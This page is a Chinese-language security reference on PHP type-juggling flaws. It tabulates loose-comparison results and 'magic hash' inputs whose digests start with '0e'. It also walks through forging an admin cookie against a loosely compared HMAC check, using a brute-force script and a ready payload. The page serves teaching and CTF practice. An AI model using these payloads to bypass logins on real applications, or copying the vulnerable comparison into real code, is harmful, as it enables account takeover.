# 类型转换

> PHP 是一种松散类型语言，这意味着它会尝试预测程序员的意图，并在似乎必要时自动将变量转换为不同的类型。例如，仅包含数字的字符串可以被视为整数或浮点数。然而，这种自动转换（或类型转换）可能会导致意外结果，特别是在使用 `==` 运算符比较变量时，该运算符仅检查值是否相等（松散比较），而不是检查类型和值是否相等（严格比较）。

## 概述

* [松散比较](#松散比较)
    * [真陈述](#真陈述)
    * [NULL 陈述](#null-陈述)
    * [松散比较](#松散比较)
* [魔法哈希](#魔法哈希)
* [方法论](#方法论)
* [实验室](#实验室)
* [参考](#参考)

## 松散比较

> 当在攻击者可以控制其中一个被比较的变量的区域中使用松散比较 (`==` 或 `!=`) 而不是严格比较 (`===` 或 `!==`) 时，就会出现 PHP 类型转换漏洞。此漏洞可能导致应用程序返回未预期的真或假答案，并可能引发严重的授权和/或身份验证错误。

* **松散** 比较：使用 `==` 或 `!=`：两个变量具有“相同的值”。
* **严格** 比较：使用 `===` 或 `!==`：两个变量具有“相同的类型和相同的值”。

### 真陈述

| 语句                             | 输出 |
| -------------------------------- |:---------------:|
| `'0010e2'   == '1e3'`            | true |
| `'0xABCdef' == ' 0xABCdef'`      | true (PHP 5.0) / false (PHP 7.0) |
| `'0xABCdef' == '     0xABCdef'`  | true (PHP 5.0) / false (PHP 7.0) |
| `'0x01'     == 1`                | true (PHP 5.0) / false (PHP 7.0) |
| `'0x1234Ab' == '1193131'`        | true (PHP 5.0) / false (PHP 7.0) |
| `'123'  == 123`                  | true |
| `'123a' == 123`                  | true |
| `'abc'  == 0`                    | true |
| `'' == 0 == false == NULL`       | true |
| `'' == 0`                        | true |
| `0  == false`                   | true |
| `false == NULL`                  | true |
| `NULL == ''`                     | true |

> PHP 8 将不再尝试将字符串转换为数字，这得益于《更安全的字符串到数字比较》提案，这意味着以“0e”开头的哈希冲突终于成为过去！《内部函数的一致类型错误》提案将防止诸如 `0 == strcmp($_GET['username'], $password)` 绕过的情况，因为 `strcmp` 不再返回 `null` 并发出警告，而是抛出适当的异常。

![松散类型比较](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/Images/table_representing_behavior_of_PHP_with_loose_type_comparisons.png?raw=true)

松散类型比较在许多语言中都会发生：

* [MariaDB](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mariadb)
* [MySQL](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mysql)
* [NodeJS](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/NodeJS)
* [PHP](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/PHP)
* [Perl](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Perl)
* [Postgres](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Postgres)
* [Python](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Python)
* [SQLite](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/SQLite/2.6.0)

### NULL 陈述

| 函数 | 语句                  | 输出 |
| ------ | -------------------- |:---------------:|
| sha1   | `var_dump(sha1([]));` | NULL |
| md5    | `var_dump(md5([]));`  | NULL |

## 魔法哈希

> 魔法哈希是由于 PHP 的类型转换中的一个特性引起的，当字符串哈希与整数进行比较时。如果一个字符串哈希以“0e”开头并且后面只包含数字，PHP 会将其解释为科学计数法，并在比较操作中将哈希视为浮点数。

| 哈希 | “魔法” 数字 / 字符串    | 魔法哈希                                    | 发现者 / 描述      |
| ---- | ------------------------ |:-------------------------------------------:| -------------:|
| MD4  | gH0nAdHk                 | 0e096229559581069251163783434175              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD4  | IiF+hTai                 | 00e90130237707355082822449868597              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD5  | 240610708                | 0e462097431906509019562988736854              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | QNKCDZO                  | 0e830400451993494058024219903391              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e1137126905             | 0e291659922323405260514745084877              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e215962017              | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 129581926211651571912466741651878684928                | 06da5430449f8f6f23dfc1276f722738              | Raw: ?T0D??o#??'or'8.N=? |
| SHA1  | 10932435112              | 0e07766915004133176347055865026311692244      | 独立发现者：Michael A. Cleverly & Michele Spagnuolo & Rogdham |
| SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
| SHA-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1148586399207178241) |
| SHA-256 | TyNOQHUS                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@Chick3nman512](https://twitter.com/Chick3nman512/status/1150137800324526083) |

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```

## 方法论

以下代码中的漏洞在于使用松散比较 (`!=`) 来验证 `$cookie['hmac']` 是否与计算出的 `$hash` 相匹配。

```php
function validate_cookie($cookie,$key){
 $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
 if($cookie['hmac'] != $hash){ // 松散比较
  return false;
  
 }
 else{
  echo "Well done";
 }
}
```

在这种情况下，如果攻击者可以控制 `$cookie['hmac']` 的值并将其设置为类似“0”的字符串，并且以某种方式操纵 `hash_hmac` 函数使其返回以“0e”开头并仅由数字组成的哈希（这会被解释为零），那么条件 `$cookie['hmac'] != $hash` 将评估为 false，从而绕过 HMAC 检查。

我们对 cookie 有三个可控元素：

* `$username` - 你要针对的目标用户名，可能是“admin”
* `$expiration` - UNIX 时间戳，必须是未来的
* `$hmac` - 提供的哈希，“0”

利用阶段如下：

* 准备恶意 cookie：攻击者准备一个 cookie，其中 `$username` 设置为目标用户（例如，“admin”），`$expiration` 设置为未来的一个 UNIX 时间戳，`$hmac` 设置为“0”。
* 强力破解 `$expiration` 值：然后攻击者强力破解不同的 `$expiration` 值，直到 `hash_hmac` 函数生成一个以“0e”开头并仅由数字组成的哈希。这是一个计算密集的过程，可能根据系统配置不可行。但如果成功，此步骤将生成一个“零似”的哈希。

```php
// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
for($i=1424869663; $i < 1835970773; $i++ ){
 $out = hash_hmac('md5', 'admin|'.$i, '');
 if(str_starts_with($out, '0e' )){
  if($out == 0){
   echo "$i - ".$out;
   break;
  }
 }
}
?>
```

* 使用强力破解的值更新 cookie 数据：`1539805986 - 0e772967136366835494939987377058`

```php
$cookie = [
 'username' => 'admin',
 'expiration' => 1539805986,
 'hmac' => '0'
];
```

* 在这种情况下，我们假设密钥为空字符串：`$key = '';`

## 实验室

* [Root Me - PHP - 类型转换](https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling)
* [Root Me - PHP - 松散比较](https://www.root-me.org/en/Challenges/Web-Server/PHP-Loose-Comparison)

## 参考

* [(超级) 魔法哈希 - myst404 (@myst404_) - 2019年10月7日](https://offsec.almond.consulting/super-magic-hash.html)
* [魔法哈希 - Robert Hansen - 2015年5月11日](http://web.archive.org/web/20160722013412/https://www.whitehatsec.com/blog/magic-hashes/)
* [魔法哈希 – PHP 哈希“冲突” - Michal Špaček (@spaze) - 2015年5月6日](https://github.com/spaze/hashes)
* [PHP 魔术技巧：类型转换 - Chris Smith (@chrismsnz) - 2020年8月18日](http://web.archive.org/web/20200818131633/https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
* [编写针对奇异漏洞类别的漏洞利用：PHP 类型转换 - Tyler Borland (TurboBorland) - 2013年8月17日](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)